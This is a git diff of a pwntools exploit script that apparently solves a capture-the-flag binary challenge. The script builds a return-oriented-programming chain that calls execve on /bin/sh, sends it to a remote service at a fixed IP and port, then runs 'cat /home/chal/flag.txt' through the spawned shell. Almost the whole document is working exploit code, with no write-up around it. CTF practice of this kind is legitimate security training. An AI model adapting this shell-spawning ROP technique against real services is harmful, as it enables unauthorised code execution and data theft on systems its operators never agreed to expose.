@@ -1,6 +1,7 @@
 from pwn import *
 
 context.arch = "amd64"
+context.terminal = ["tmux", "splitw", "-h"]
 
 # 0x0000000000450087 : pop rax ; ret
 # 0x0000000000401f0f : pop rdi ; ret
@@ -12,44 +13,27 @@ context.arch = "amd64"
 
 def main():
     r = remote("10.113.184.121", 10052)
-    context.terminal = ["tmux", "splitw", "-h"]
-    r = process("./share/chal")
-    attach(r)
+    # r = process("./share/chal")
+    # attach(r)
     r.recvuntil(b"> ")
-    # ropc = flat(
-    #     [
-    #         0x0000000000401F0F,  # pop rdi ; ret
-    #         0x0000000000498027,  # /bin/sh
-    #         0x0000000000409F7E,  # pop rsi ; ret
-    #         0x0,
-    #         0x0000000000485E0A,  # pop rax ; pop rdx ; pop rbx ; ret
-    #         # 0x0a is prohibited
-    #         0x3B,  # rax = 0x3B, execve
-    #         0x0,  # rdx = 0
-    #         0x0,  # rbx = 0
-    #         0x0000000000401CC4,  # syscall
-    #     ]
-    # )
-    ropc = flat(
-        [
-            0x0000000000450087,  #  pop rax ; ret
-            0x3B,  # rax = 0x3B, execve
-            0x0000000000401F0F,  # pop rdi ; ret
-            0x0000000000498027,  # /bin/sh
-            0x0000000000409F7E,  # pop rsi ; ret
-            0x0,
-            0x0000000000485E0B,  # pop rdx ; pop rbx ; ret
-            0x0,  # rdx = 0
-            0x0,  # rbx = 0
-            0x0000000000401CC4,  # syscall
-        ]
+    payload = flat(
+        {
+            0x18: [
+                [0x0000000000450087, 0x3B],  #  pop rax ; ret  # rax = 0x3B, execve
+                [0x0000000000401F0F, 0x0000000000498027],  # pop rdi ; ret  # /bin/sh
+                [0x0000000000409F7E, 0x0],  # pop rsi ; ret
+                [0x485E0B, 0x0, 0x0],  # pop rdx ; pop rbx ; ret  # rdx = 0 # rbx = 0
+                0x0000000000401CC4,  # syscall
+            ]
+        }
     )
-    payload = b"a" * 3 + ropc
     nw = "\n"
     log.info(f"payload\n{payload.hex(sep=nw, bytes_per_sep=-8)}")
     # input()
     r.sendline(payload)
-    r.interactive()
+    r.sendline(b"cat /home/chal/flag.txt")
+    print(r.recv().decode().strip())
+    r.close()
 
 
 if __name__ == "__main__":
